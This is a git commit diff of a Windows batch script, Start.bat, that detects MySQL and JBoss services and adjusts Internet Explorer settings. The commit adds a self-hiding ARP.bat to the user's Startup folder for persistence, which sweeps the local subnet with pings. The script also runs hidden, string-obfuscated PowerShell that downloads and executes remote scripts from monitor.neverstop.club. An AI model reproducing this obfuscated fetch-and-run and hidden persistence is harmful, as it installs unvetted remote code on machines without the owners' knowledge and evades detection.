ac9e66b4dbd53123ea1f7f89afd2f63641e100c8
andystive <vvirus@foxmail.com>
2020-08-08 18:04:31 +0800

    Update Start.bat
    2020-08-08 完善初版
    
    Co-Authored-By: John <virus@users.noreply.github.com>

--- Start.bat
+++ Start.bat
@@ -15,15 +15,22 @@ echo.          #########################################################
 
 @echo off
 rem 检测是否存在APR脚本，不存在则添加
-if exist %programdata%\Microsoft\Windows\Start Menu\Programs\Startup\ARP.bat (
+set ARP="%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ARP.bat"
+if exist %ARP% (
     goto MySQL
-) ELSE (
-    echo for /f "tokens=2 delims=:" %%i in ('ipconfig^|findstr /c:"IPv4"') do (for /f "tokens=1,2,3,4 delims=." %%a in ('echo %%i') do set Three=%%c) >%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\ARP.bat
-    echo for /L %%i IN (1,1,254) DO ping -w 2 -n 1 192.168.%Three%.%%i >>%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\ARP.bat
+	) ELSE (
+	echo if "%%1"=="hide" goto CmdBegin >%ARP%
+    echo start mshta vbscript:createobject("wscript.shell"^).run("""%%~0"" hide",0^)(window.close^)^&^&^exit >>%ARP%
+    echo :CmdBegin >>%ARP%
+    echo ———————————————— >>%ARP%
+	echo @echo off >>%ARP%
+	echo for /f "tokens=2 delims=:" %%%%i in ('ipconfig^^^|findstr /c:"IPv4"'^) do (for /f "tokens=1,2,3,4 delims=." %%%%a in ('echo %%%%i'^) do set Three=%%%%c^) ^>nul >>%ARP%
+    echo for /L %%%%i in (1,1,254^) do ping -w 2 -n 1 192.168.%%Three%%.%%%%i ^>nul >>%ARP%
+	start %ARP%
+	goto MySQL
 )
     
-
-goto MySQL
+:Jboss
 rem 查询系统是否存在jboss服务，判断是否为主机
 rem 暂未启用，因个别副机上也装有Jboss服务，容易造成误判
 SC QUERY jboss >NUL 2>&1
@@ -38,7 +45,7 @@ if ERRORLEVEL 1060 (
 :MySQL
 rem 查询MySQL服务是否启动，判断是否为主机
 set M_Status=1 
-(tasklist|findstr "mysql"||set M_Status=0) >NUL 2>&1
+(tasklist|findstr "mysql"||set M_Status=0) >nul 2>&1
 IF %M_Status% EQU 0 (
     echo 未检测到 MySQL 服务，正在访问系统地址，请稍等...
     goto IESettings
@@ -50,12 +57,12 @@ IF %M_Status% EQU 0 (
 :StartJboss
 rem 检测Jboss服务是否启动
 set J_Status=1 
-(tasklist|findstr "jboss"||set J_Status=0) >NUL 2>&1
-IF %J_Status% EQU 0 (
+(tasklist|findstr "jboss"||set J_Status=0) >nul 2>&1
+if %J_Status% EQU 0 (
     echo Jboss 服务未启动，正在启动服务，请稍等...
     net start jboss
     goto PrimaryIESettings
-) ELSE (
+) else (
     echo Jboss 服务已启动，正在访问系统，请稍等...
     goto IESettings
 )
@@ -63,16 +70,12 @@ IF %J_Status% EQU 0 (
 :PrimaryIESettings
 rem 调用主机powershell脚本，添加可信站点，兼容性视图
 call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/PrimaryIESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)"
-goto ARP
+goto exit
 
 :IESettings
 rem 调用副机powershell脚本，添加可信站点，兼容性视图
 call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/IESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)"
-goto ARP
+goto exit
 
-
-:ARP
-rem 获取本地ip地址段，然后刷新副机arp表
-for /f "tokens=2 delims=:" %%i in ('ipconfig^|findstr /c:"IPv4"') do (for /f "tokens=1,2,3,4 delims=." %%a in ('echo %%i') do set Three=%%c)
-for /L %%i IN (1,1,254) DO ping -w 2 -n 1 192.168.%Three%.%%i >nul
+:exit
 exit
